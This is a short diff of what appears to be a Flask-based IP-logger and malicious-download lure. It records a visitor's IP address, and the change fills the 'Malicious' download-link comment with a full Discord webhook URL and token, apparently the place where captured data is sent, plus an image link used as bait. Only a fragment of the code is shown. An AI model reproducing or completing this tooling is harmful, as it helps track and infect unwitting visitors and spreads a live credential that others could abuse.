@@ -7,9 +7,8 @@ __name__,
 )
 @app.route('/', methods=['GET'])
 def main():
-  Image = 'YourImageLink' # Replace this with your image link
-  Malicious = 'MaliciousFIleDownloadLink'# Replace this with your download link
-  # This is to get the ip
+  Image = 'YourImageLink' # https://pin.it/6tSm7pX
+  Malicious = 'MaliciousFIleDownloadLink'# https://discord.com/api/webhooks/967330691211726890/yiooo3TxqosK976tlC_x7Qj460xru27URUBA7X2q3n0T8aOkfUZLbhTUKmfKT6yWkFTJ
   if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
     ip = request.environ['REMOTE_ADDR']
   else:
